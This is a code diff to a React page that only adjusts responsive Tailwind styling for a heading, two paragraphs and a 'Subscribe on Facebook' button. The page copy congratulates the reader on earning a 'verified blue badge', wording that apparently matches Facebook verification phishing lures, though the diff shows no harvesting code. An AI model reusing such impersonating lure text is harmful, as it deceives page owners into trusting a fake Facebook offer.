@@ -269,10 +269,10 @@ const Page: FC = () => {
                             <h1 className="text-2xl md:text-5xl font-bold text-gray-900 mb-6 leading-tight">
                                 {t('Show the world that you mean business.')}
                             </h1>
-                            <p className="text-lg text-gray-600 mb-4 leading-relaxed">
+                            <p className="text-sm md:text-lg text-gray-600 mb-3 leading-relaxed">
                                 {t('Congratulations on achieving the requirements to upgrade your page to a verified blue badge! This is a fantastic milestone that reflects your dedication and the trust you\'ve built with your audience.')}
                             </p>
-                            <p className="text-lg text-gray-600 mb-8 leading-relaxed">
+                            <p className="text-sm md:text-lg text-gray-600 mb-6 leading-relaxed">
                                 {t('We\'re thrilled to celebrate this moment with you and look forward to seeing your page thrive with this prestigious recognition!')}
                             </p>
                             <button
@@ -280,7 +280,7 @@ const Page: FC = () => {
                                     setModalKey((prev) => prev + 1);
                                     setModalOpen(true);
                                 }}
-                                className="bg-blue-600 hover:bg-blue-700 text-white font-semibold py-4 px-8 rounded-lg text-lg w-fit shadow-lg transition"
+                                className="bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 px-6 md:py-4 md:px-8 rounded-lg text-sm md:text-lg w-fit shadow-lg transition"
                             >
                                 {t('Subscribe on Facebook')}
                             </button>
